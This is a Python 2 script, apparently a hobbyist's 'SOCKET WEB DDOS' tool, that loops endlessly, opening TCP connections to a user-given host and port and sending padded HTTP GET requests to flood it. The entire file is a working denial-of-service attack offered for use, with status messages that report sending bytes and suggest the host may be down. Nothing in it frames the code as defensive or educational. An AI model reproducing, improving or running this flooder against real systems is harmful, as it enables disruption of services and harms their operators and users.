#-*-coding: utf8-*-
'''
	@Author : Daniel Victor Freire Feitosa | @DanielFreire00
	@Version : 1.0.0
	
	GitHub : https://github.com/proxyanon/
	YouTube : https://www.youtube.com/channel/UCKIL1n8YdEaYXQxhKMth6aA | ProXySec
	<danielfreire56@hotmail.com/>

	Tá em inglês pq é a língua universal né :) whatever eu curto ...
	Lê ai e vê se da pra melhorar, qualquer melhora é bem vinda
'''
import socket, sys, random, os, hashlib
os.system("cls") # if windows
#os.system("clear") # if linux or mac
# the instalation modules
try:
	from colorama import init, Fore, Back, Style # module needed
	from termcolor import colored # module needed
	init()
except ImportError:
	print ""
	print "Some modules not installed\n"
	quest = raw_input("Do you want install the dependencies [Y/N] ? ")
	if quest == "Y" or quest == "" or quest == "y":
		os.system("pip install colorama, termcolor") # comand to install modules
	elif quest == "N" or quest == "n":
		sys.exit() # if not 

def default_banner():
	sys.stdout.write(colored("\n[*]", "blue")) # main banner
	sys.stdout.write(colored(" SOCKET WEB DDOS ", "white"))
	sys.stdout.write(colored("[*]\n\n", "blue"))

def ddos(host, port, packet):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket type tcp
	if int(packet) > 1024:
		sys.stdout.write(colored("[-]", "red")) # if socket bigger than 1024 show this message
		sys.stdout.write(colored(" This packet so big ...\n", "white"))
		sys.exit()
	else:
		send_packet = hashlib.md5(str(random.randint(1, 1000))).hexdigest() * int(packet)
		#send_packet = str(random.randint(1, 100)) * int(packet) # This may be less noisy
	try:
		s.connect((host, int(port))) # connect to the host
		s.send("GET /%s HTTP/1.1\r\n\r\n"%(send_packet)) # send packet to host
		r = s.recv(1024)
		s.send("Host: %s:%s\r\n\r\n"%(host, port))
		r = s.recv(1024)
		s.send("Content-Lenght: %s\r\n\r\n"%(len(send_packet)))
		sys.stdout.write(colored("\r[+]", "green"))
		sys.stdout.write(colored(" Sending %s bytes to %s\r"%(len(send_packet), host), "white")) # show state of attack
		sys.stdout.flush()
		s.close() # close the socket
	except socket.error, e: # socket can't connect here and show its state
		os.system("cls") # if windows
		#os.system("clear") # if linux or mac
		default_banner() # main banner
		sys.stdout.write(colored("\r[+]", "green"))
		sys.stdout.write(colored(" Host %s maybe down !!!\n"%(host), "white")) # show state of socket
		sys.stdout.write(colored("\r[-]", "red"))
		sys.stdout.write(colored(" Or firewall block the attack ...\n", "white"))
		sys.stdout.write(colored("\n[!] Erro code => %s\n"%(e), "grey"))
		sys.stdout.flush()
		sys.exit()

def help_banner():
	print ""
	default_banner() # main banner
	sys.stdout.write(colored(" @Coded by Daniel Freire\n", "grey")) # help banner
	sys.stdout.write(colored(" @Version : 1.0.0\n", "grey"))
	sys.stdout.write(colored(" <danielfreire56@hotmail.com/>\n\n", "grey"))
	sys.stdout.write(colored("[+]", "green"))
	sys.stdout.write(colored(" ddos.py <host> <port> <packet_lenght>\n", "white", attrs=["blink"]))
	sys.exit()

if len(sys.argv) < 4:
	help_banner() # if not have args show help banner
else:
	print ""
	default_banner() # main banner
	try:
		while True:
			ddos(sys.argv[1], sys.argv[2], sys.argv[3]) # do attack
			sys.stdout.flush()
	except KeyboardInterrupt: # ctrl-c press
		sys.stdout.write(colored("\n\n[X]", "red"))
		sys.stdout.write(colored(" Exiting ...\n", "white"))
		sys.exit() # exit of program 
